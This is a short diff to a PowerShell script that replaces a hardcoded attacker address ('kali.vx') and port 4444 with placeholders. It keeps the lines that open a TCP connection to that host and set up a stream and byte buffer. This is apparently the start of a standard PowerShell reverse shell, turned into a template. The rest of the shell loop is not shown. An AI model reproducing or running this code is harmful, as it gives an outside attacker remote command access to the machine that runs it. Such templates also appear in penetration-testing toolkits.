@@ -1,5 +1,5 @@
-$ADDRESS='kali.vx'
-$PORT=4444
+$ADDRESS='<ADDRESS>'
+$PORT=<PORT>
 $CLIENT = New-Object System.Net.Sockets.TCPClient($ADDRESS,$PORT)
 $STREAM = $CLIENT.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
